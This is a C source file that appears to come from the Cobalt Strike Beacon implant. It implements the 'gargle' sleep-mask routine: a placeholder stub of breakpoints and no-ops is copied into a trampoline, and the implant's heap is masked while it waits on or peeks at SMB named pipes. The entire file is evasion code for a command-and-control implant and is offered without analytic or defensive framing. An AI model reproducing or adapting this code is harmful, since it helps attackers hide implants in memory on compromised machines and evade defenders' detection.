/* gargle! */
#include <WinSock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"

#define GARGLE_ACTION_PIPE_WAIT   0
#define GARGLE_ACTION_PIPE_PEEK   1

typedef struct {
	int    action;
	HANDLE pipe;
	BOOL (__stdcall *ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
	DWORD(__stdcall *GetLastError)(void);
	BOOL(__stdcall *PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
	void(__stdcall *Sleep)(DWORD);
} GARGLE_PIPE_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_PIPE_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_PIPE_ARGS * args) {
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleBlockPipe(HANDLE pipe) {
	GARGLE_PIPE_ARGS args;
	GARGLEF         func;

	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		/* do nothing */
	}
	else {
		/* create our trampoline, please */
		setup_trampoline2();

		/* setup our arguments */
		args.action = GARGLE_ACTION_PIPE_PEEK;
		args.pipe = pipe;
		args.PeekNamedPipe = PeekNamedPipe;
		args.Sleep = Sleep;

		/* get the heap sections to mask. */
		gparms->heap_records = track_memory_get_heap_records_to_mask();

		/* call our function */
		func = (GARGLEF)gtrampoline;
		func(gparms, &args);
	}
}

BOOL GarglePipeWait(HANDLE pipe) {
	GARGLE_PIPE_ARGS args;
	GARGLEF         func;

	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		return FALSE;
	}
	else {
		/* create our trampoline, please */
		setup_trampoline2();

		/* setup our arguments */
		args.action           = GARGLE_ACTION_PIPE_WAIT;
		args.pipe             = pipe;
		args.GetLastError     = GetLastError;
		args.ConnectNamedPipe = ConnectNamedPipe;

		/* get the heap sections to mask. */
		gparms->heap_records = track_memory_get_heap_records_to_mask();

		/* call our function */
		func = (GARGLEF)gtrampoline;
		func(gparms, &args);

		/* return the out value from our struct */
		return TRUE;
	}
}